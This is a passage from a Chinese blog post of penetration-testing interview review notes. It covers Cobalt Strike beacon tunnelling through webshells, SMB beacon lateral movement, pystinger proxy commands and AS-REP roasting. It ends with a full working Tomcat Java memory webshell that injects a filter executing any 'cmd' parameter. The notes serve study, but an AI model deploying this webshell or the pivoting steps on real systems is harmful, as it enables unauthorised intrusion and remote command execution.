+<li>server将于目的地址及端口建立tcp连接,发送数据。<br>  <strong>大部分建立连接及处理数据的工作由不出网主机中运行的server端实现，webshell只进行http请求的转发操作。</strong><br><a href="https://smms.app/image/UWL2R7pIsbrZYAM" target="_blank"><img src="https://s2.loli.net/2024/03/25/UWL2R7pIsbrZYAM.webp" ></a></li>
+</ul>
+<h4 id="反向端口映射"><a href="#反向端口映射" class="headerlink" title="反向端口映射"></a>反向端口映射</h4><p>  <strong>server端：</strong></p>
+<ul>
+<li>beacon将http请求(假设数据为AAAAAA)发送到server。</li>
+<li>server将(AAAAAA)存储到缓存，并保持与beacon的http连接。</li>
+</ul>
+<p>  <strong>client端：</strong></p>
+<ul>
+<li>请求webshell。</li>
+<li>webshell转发请求到server。</li>
+<li>server将缓存的(AAAAA)填充到http应答中。</li>
+<li>webshell将server的应答转发给client。</li>
+<li>client从应答中获取数据(AAAAA)。</li>
+<li>client与cobaltstike的listener建立tcp连接。</li>
+<li>client发送(AAAAA)到cobaltstrike的listener。</li>
+<li>conbaltstrike发送应答数据(BBBBBB)。</li>
+<li>client将数据(BBBBB)封装到http请求中,通过webshell转发到server。</li>
+<li>server通过之前保持的http连接将(BBBBBB)发送到beacon。<br><a href="https://smms.app/image/nKy2ecQ54PXYCZu" target="_blank"><img src="https://s2.loli.net/2024/03/25/nKy2ecQ54PXYCZu.webp" ></a><br>  可以看到我们可以通过新的方法直接使用reverse_https类型的beacon上线。上图中只是不出网的当前主机上线,如果我们需要内网其他主机上线也可以,原理图稍有变更。<br>  只要将server的监听从127.0.0.1改为0.0.0.0即可，这样的话内网其他主机就可以通过不出网主机上线了。<br><a href="https://smms.app/image/ShWNvgHBD1GEdRl" target="_blank"><img src="https://s2.loli.net/2024/03/25/ShWNvgHBD1GEdRl.webp" ></a></li>
+</ul>
+<h4 id="使用smb-beacon"><a href="#使用smb-beacon" class="headerlink" title="使用smb beacon"></a>使用smb beacon</h4><p>  SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。<br>  因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。<br>  SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p>
+<h5 id="连接步骤"><a href="#连接步骤" class="headerlink" title="连接步骤"></a>连接步骤</h5><p>  1. 首先得到内网中一台主机的beacon，抓取密码后进行smb喷洒<br>  2. 得到另一台开放445端口的机器上的administrator账户密码<br>  3. 用Smb beacon使目标主机上线</p>
+<h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><ul>
+<li>具有 SMB Beacon 的主机必须接受 445 端口上的连接。</li>
+<li>只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</li>
+<li>利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</li>
+</ul>
+<h4 id="配置listener通过HTTP代理上线"><a href="#配置listener通过HTTP代理上线" class="headerlink" title="配置listener通过HTTP代理上线"></a>配置listener通过HTTP代理上线</h4><p>  1. 使用<a href="https://github.com/snail007/goproxy">goproxy</a>项目做代理<br>  2. 上传proxy.exe到web服务器(边缘主机)，在8080端口开启http代理<br>  3. 用netsh命令将访问内网ip的822端口(必须为未使用的端口，否则会失败)的流量重定向到外网ip的8080端口</p>
+<h4 id="使用pystinger搭建socks4代理"><a href="#使用pystinger搭建socks4代理" class="headerlink" title="使用pystinger搭建socks4代理"></a>使用<a href="https://github.com/FunnyWolf/pystinger">pystinger</a>搭建socks4代理</h4><p>  服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量</p>
+<h5 id="连接步骤-1"><a href="#连接步骤-1" class="headerlink" title="连接步骤"></a>连接步骤</h5><p>  1. 上传proxy.php到网站目录，正常访问返回UTF-8<br>  2. 上传stinger_server.exe，执行<code>start stinger_server.exe 0.0.0.0</code><br>  3. Kali上执行<code>./stinger_client -w http://xxxxxxxxx:81/proxy.php -l 127.0.0.1 -p 60000</code><br>  4. cs中新建listener，xxxxxxxxx为web服务器内网ip，60020为转发端口<br>  5. 使用psexec横向移动，选择listener为stinger，成功上线</p>
+<h2 id="域内攻击方法"><a href="#域内攻击方法" class="headerlink" title="域内攻击方法"></a>域内攻击方法</h2><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>  详情请看<a href="https://liu1272.github.io/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/#MS14-068%E6%94%BB%E5%87%BB">上一篇文章</a></p>
+<h4 id="Roasting-攻击离线爆破密码"><a href="#Roasting-攻击离线爆破密码" class="headerlink" title="Roasting 攻击离线爆破密码"></a>Roasting 攻击离线爆破密码</h4><p>  AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 <code>Do not require Kerberos preauthentication(不需要kerberos预身份验证) </code> 。而该属性默认是没有勾选上的。<br>  预身份验证是Kerberos身份验证的第一步，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。<br>  当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。<br>  攻击时使用 Rubeus.exe 获取hash，再使用hashcat对获得的Hash进行爆破</p>
+<h4 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a><a href="https://xz.aliyun.com/t/11555">委派攻击</a></h4><p>  原理比较简单，但是实现较为困难，以后有空再回头来学习。</p>
+<h4 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a><a href="https://liu1272.github.io/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/#NTLM-Relay%E6%94%BB%E5%87%BB">ntlm relay</a></h4><p>  同样是上一篇文章的内容。</p>
+<h2 id="Java内存马代码"><a href="#Java内存马代码" class="headerlink" title="Java内存马代码"></a>Java内存马代码</h2><pre class="line-numbers language-Java"><code class="language-Java">
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import = "org.apache.catalina.Context" %>
+<%@ page import = "org.apache.catalina.core.ApplicationContext" %>
+<%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import = "org.apache.catalina.core.StandardContext" %>
+
+
+<!-- tomcat 8/9 -->
+<!-- page import = "org.apache.tomcat.util.descriptor.web.FilterMap"
+page import = "org.apache.tomcat.util.descriptor.web.FilterDef" -->
+
+
+<!-- tomcat 7 -->
+<%@ page import = "org.apache.catalina.deploy.FilterMap" %>
+<%@ page import = "org.apache.catalina.deploy.FilterDef" %>
+
+
+<%@ page import = "javax.servlet.*" %>
+<%@ page import = "java.io.IOException" %>
+<%@ page import = "java.lang.reflect.Constructor" %>
+<%@ page import = "java.lang.reflect.Field" %>
+<%@ page import = "java.util.Map" %>
+
+
+<%
+class filterDemo implements Filter &#123;
+@Override
+public void init(FilterConfig filterConfig) throws ServletException &#123;
+&#125;
+public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
+String cmd = servletRequest.getParameter("cmd");
+if (cmd!= null) &#123;
+Process process = Runtime.getRuntime().exec(cmd);
+java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+new java.io.InputStreamReader(process.getInputStream()));
+StringBuilder stringBuilder = new StringBuilder();
+String line;
+while ((line = bufferedReader.readLine()) != null) &#123;
+stringBuilder.append(line + '\n');
+&#125;
+servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+servletResponse.getOutputStream().flush();
+servletResponse.getOutputStream().close();
+return;
+&#125;
+filterChain.doFilter(servletRequest, servletResponse);
+&#125;
+
+
+@Override
+public void destroy() &#123;
+
+
+&#125;
+
+
+&#125;
+%>
+
+
+
+
+<%
+//从org.apache.catalina.core.ApplicationContext反射获取context方法
+ServletContext servletContext =  request.getSession().getServletContext();
+Field appctx = servletContext.getClass().getDeclaredField("context");
+appctx.setAccessible(true);
+ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+Field stdctx = applicationContext.getClass().getDeclaredField("context");
+stdctx.setAccessible(true);
+StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
+Configs.setAccessible(true);
+Map filterConfigs = (Map) Configs.get(standardContext);
+
+
+String name = "filterDemo";
+//判断是否存在filterDemo1这个filter，如果没有则准备创建
+if (filterConfigs.get(name) == null)&#123;
+//定义一些基础属性、类名、filter名等
+filterDemo filter = new filterDemo();
+FilterDef filterDef = new FilterDef();
+filterDef.setFilterName(name);
+filterDef.setFilterClass(filter.getClass().getName());
+filterDef.setFilter(filter);
+
+
+//添加filterDef
+standardContext.addFilterDef(filterDef);
+
+
+//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*
+FilterMap filterMap = new FilterMap();
+// filterMap.addURLPattern("/*");
+filterMap.addURLPattern("/zzz");
+filterMap.setFilterName(name);
+filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+
+//添加我们的filterMap到所有filter最前面
+standardContext.addFilterMapBefore(filterMap);
+
+
+//反射创建FilterConfig，传入standardContext与filterDef
+Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+constructor.setAccessible(true);
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+
+
+//将filter名和配置好的filterConifg传入
+filterConfigs.put(name,filterConfig);
+out.write("Inject success!");
+&#125;
+else&#123;
+out.write("Injected!");
+&#125;
+%>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>看了三天面试题，从面试题入手查漏补缺感觉收获良多。<br>  这几天可能会有一些面试，有可能会鸽两天去复习巩固一下基础知识了。</strong></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="Shunyu 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="Shunyu 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%97%A5%E6%8A%A5/" rel="tag"><i class="fa fa-tag"></i> 日报</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/" rel="prev" title="面试复习三">
+                  <i class="fa fa-angle-left"></i> 面试复习三
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/04/01/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%BA%94/" rel="next" title="面试复习五">
+                  面试复习五 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="valine-comments"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Shunyu</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">157k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/liu1272" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/comments.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/motion.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/sidebar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/next-boot.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/bookmark.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/search/local-search.min.js"></script>
+
+  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.0/pdfobject.min.js","integrity":"sha256-JJZNsid68vnh3/zyj0lY9BN5ynxVX/12XgOa1TlaYN0="},"url":"/lib/pdf/web/viewer.html"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/tags/pdf.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/fancybox.min.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+<script class="next-config" data-name="valine" type="application/json">{"enable":true,"appId":"Saj0Y9foXlqnIK4Ing0paYci-MdYXbMMI","appKey":"eSefitZxNdI9H6p6lkyRYI5g","serverURLs":"https://saj0y9fo.api.lncldglobal.com","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":true,"enableQQ":true,"requiredFields":[],"el":"#valine-comments","path":"/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.valine.el)
+    .then(() => NexT.utils.getScript(
+      'https://fastly.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+      { condition: window.Valine }
+    ))
+    .then(() => {
+      new Valine(CONFIG.valine);
+    });
+});
+</script>
+
+
+</body>
+</html>
